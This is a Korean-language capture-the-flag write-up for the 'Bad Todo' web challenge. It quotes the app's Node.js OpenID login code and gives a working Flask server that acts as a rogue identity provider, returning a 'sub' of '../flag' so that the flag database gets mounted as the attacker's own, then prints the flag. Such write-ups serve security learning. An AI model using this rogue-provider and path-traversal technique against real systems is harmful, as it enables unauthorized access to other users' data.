# Bad Todo (247 Points) - 75 Solved
얘는 코드만 살짝 복잡할 뿐, 막상 풀이 자체는 쉽다.
먼저 FLAG위치를 살펴보기 위해선 prime_flag.js를 살펴보면 된다.

```
import { promises as fs, existsSync } from "fs";
import { createClient } from "@libsql/client";

export async function primeFlag() {
    if (existsSync(process.env.STORAGE_LOCATION + "/flag")) {
        await fs.chmod(process.env.STORAGE_LOCATION + "/flag", 0o700);
        await fs.rm(process.env.STORAGE_LOCATION + "/flag");
    }
    
    const client = createClient({
        url: `file://${process.env.STORAGE_LOCATION}/flag`
    });

    await client.execute("CREATE TABLE todos(text TEXT NOT NULL, done BOOLEAN)");
    await client.execute("INSERT INTO todos(text, done) VALUES(?, ?)", [process.env.FLAG, true]);
    await client.close();

    await fs.chmod(process.env.STORAGE_LOCATION + "/flag", 0o400);
}
```
FLAG환경변수를 가져와서 STORAGE_LOCATION/flag에 넣고 있다.
STORAGE_LOCATION위치는 .env파일에 `/opt/bad-todo/storage` 로 나와있다.
즉, /opt/bad-todo/storage/flag라는 db file에 flag값을 저장한다.

여기까지 파악해두고, app.js로 가면 다음과 같은 경로를 볼 수 있다.
```
app.post("/start", asyncHandler(async (req, res) => {
    let response = null;
    try {
        response = await safeJson(req.body.issuer + "/.well-known/openid-configuration");
    } catch(e) {
        res.sendStatus(400);
        res.write("Invalid OpenID configuration ;_;");
        res.end();
        return;
    }
    if (response && response.issuer && response.authorization_endpoint && response.token_endpoint && response.userinfo_endpoint) {
        const session = await newSession(req.body.issuer, req.body.client_id);
        console.log(session);

        const search = new URLSearchParams();
        search.append("client_id", req.body.client_id);
        search.append("redirect_uri", process.env.BASE + "/auth_redirect");
        search.append("scope", "openid");
        search.append("response_type", "code");
        search.append("state", session);

        
        res.setHeader("Set-Cookie", `session=${session}; HttpOnly; Max-Age=3600; SameSite=Lax; Secure`);
        res.setHeader("Location", `${response.authorization_endpoint}?${search.toString()}`)
        res.sendStatus(302);
        
    } else {
        res.sendStatus(400);
        res.write("Invalid OpenID configuration ;_;");
        res.end();
    }
}));
```
`req.body.issuer + "/.well-known/openid-configuration"`에서 반환하는 값을 정보들로 사용하고 있는데 issuer은 safe_fetch.js코드를 보면 알 수 있듯이 `https://`스킴이면은 모든 허용한다.
아래는 safe_fetch.js코드이다.
```
export async function safeFetch(url, params) {
    const urlParsed = new URL(url);
    if (urlParsed.protocol !== "https:") throw new Error("use https");

    const resolved = await dns.resolve(urlParsed.host);
    const isOk = resolved.every(ip => {
        const parsed = ipaddr.parse(ip);
        const match = ipaddr.subnetMatch(parsed, unsafeIps, "ok");

        return match === "ok";
    });

    if (!isOk) throw new Error("unsafe url");
    
    return await fetch(url, params);
}

export async function safeJson(url, params) {
    const response = await safeFetch(url, params);

    if (response.status !== 200) return false;
    if (!response.body) return false;

    const reader = response.body.getReader();

    const data = await cappedReader(reader, 0xFFFF);
    const decoder = new TextDecoder();
    const str = decoder.decode(data);

    return JSON.parse(str);
}
```
따라서 issuer을 내 ip로 해서 요청을 보낼 수 있다.

그리고 아래는 app.js의 /auth_redirect경로 부분이다.
```
app.get("/auth_redirect", asyncHandler(async (req, res) => {
    if (!req.cookies.session) return res.end("No session");
    if (req.cookies.session !== req.query.state) return res.end("Bad state");
    if (req.query.error) {
        return res.end("identity provider gave us an error.");
    }
    
    const sessionDetails = await lookupSession(req.cookies.session);
    const response = await safeJson(sessionDetails.idpUrl + "/.well-known/openid-configuration");
    if (!response.token_endpoint) return res.end("No token endpoint");
    if (!response.userinfo_endpoint) return res.end("No user info endpoint");

    const search = new URLSearchParams();
    search.append("grant_type", "authorization_code");
    search.append("code", req.query.code);
    search.append("redirect_uri", process.env.BASE + "/auth_redirect");
    search.append("client_id", sessionDetails.clientId);
    
    const tokenResponse = await safeJson(response.token_endpoint, {
        method: "POST",
        body: search.toString(),
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        }
    });

    if (!tokenResponse || !tokenResponse.access_token || !tokenResponse.token_type) return res.end("Bad token response");

    const userInfo = await safeJson(response.userinfo_endpoint, {
        headers: {
            "Authorization": `${tokenResponse.token_type} ${tokenResponse.access_token}`
        }
    });

    if (!userInfo || !userInfo.sub) return res.end("user has no sub");

    await successfulLogin(req.cookies.session, userInfo);
    res.setHeader("Location", `/`)
    res.sendStatus(302);
}));
```
코드를 보면은 위에 내 ip에서 얻은 json값을 파싱해서 token_endpoint에 POST로 요청을 보낸다.그 후 access_token과 token_type이 있으면 통과를 하니 여기서도 token_endpoint를 내 서버로 지정하고 access_token과 token_type을 반환할 수 있게 한다.
그 다음은 userinfo_endpoint에 요청을 보내서 userInfo에 저장하고 userInfo.sub이 있는지 확인한다.
userinfo_endpoint도 마찬가지로 내 서버로 조작해서 sub값을 마으대로 조작할 수 있다.
그러면 이제 마지막 successfullLogin함수로 가보겠다.

```
export async function successfulLogin(session, metadata) {
    await client.execute("UPDATE sessions SET userId = ?, userMetadata = ? WHERE id = ?", [metadata.sub, JSON.stringify(metadata), session]);
}
```
sub값을 userId에 넣고
storage.js의 getStoragePath함수로 가보면은
```
export function sanitizePath(base) {
    const normalized = path.normalize(path.join(process.env.STORAGE_LOCATION, base));
    const relative = path.relative(process.env.STORAGE_LOCATION, normalized);
    if (relative.includes("..")) throw new Error("Path insane");

    const parent = path.dirname(normalized);
    mkdirSync(parent, { recursive: true });
    
    return normalized;
}

export function getStoragePath(idp, sub) {
    const first2 = sub.substring(0, 2);
    const rest = sub.substring(2);

    const path = `${sha256sum(idp)}/${encodeURIComponent(first2)}/${encodeURIComponent(rest)}`;
    return sanitizePath(path);
}
```
해당 id값을 다시 sub로 활용하여 db file위치를 반환하고 있다.
이때 sanitizePath를 통해 STORAGE_LOCATION 즉, /opt/bad-todo/storage보다 상위 폴더로 접근하려 하면 차단하는데
우리가 원하는건 flag이기 때문에 상위폴더로 갈 필요가 없고 ../flag를 사용해서 flag db file을 내 db file인 것 처럼 바꿔 끼워넣으면 된다.

아래는 위의 조건들을 모두 만족하게 하여 내 서버에 돌린 코드이다.
```
from flask import Flask, jsonify, Response
import requests

app = Flask(__name__)

@app.route('/.well-known/openid-configuration', methods=['GET'])
def gopher_test():
    return "{\"issuer\":\"aa\", \"authorization_endpoint\":\"b\", \"token_endpoint\":\"https://qweee.run.goorm.app\", \"userinfo_endpoint\":\"https://qweee.run.goorm.app/sub\"}"

@app.route('/', methods=['POST'])
def post():
    return "{\"access_token\":\"hh\", \"token_type\":\"ce\"}"

@app.route('/sub', methods=['GET'])
def post2():
    ascii_char = chr(255)
    return """
    {"name":"ccc", "sub":"../flag"}
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

아래는 익스 과정이다.

1. 위의 코드를 내 서버에 띄운다.
2. /start에 내 서버 url을 담은 요청을 날린다.
![image](https://github.com/user-attachments/assets/9eda0690-e1f1-4d31-8a3c-ade00c5df723)
3. /start에서 받은 session값을 쿠키와 state에 담고 /auth_redirect로 요청한다.
![image](https://github.com/user-attachments/assets/91755535-1c9c-473e-9f36-41da3fdede60)
4. 해당 세션값을 가지고 메인페이지로 가면 flag db가 내 db로 끼워지게 되어 있는걸 확인할 수 있고 flag를 획득 가능하다.
![image](https://github.com/user-attachments/assets/fc1be0db-cc36-4911-b2af-0e6775669b78)


**FLAG** : `irisctf{per_tenant_databases_are_a_cool_concept_indeed}`

